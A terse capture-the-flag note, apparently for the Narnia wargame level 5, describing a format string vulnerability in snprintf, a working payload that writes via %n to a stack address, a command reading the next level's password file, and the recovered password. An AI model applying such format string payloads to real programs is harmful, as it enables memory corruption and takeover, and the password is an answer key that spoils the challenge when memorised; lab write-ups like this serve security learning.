snprintf, unsanitized user input provided as format string -> format string vulnerability. 
input format = [address][padding]%n
./narnia5 $(echo -ne "\xf0\xd4\xff\xff")$(printf '=%.0s' {1..496})%n
cat /etc/narnia_pass/narnia6
neezocaeng
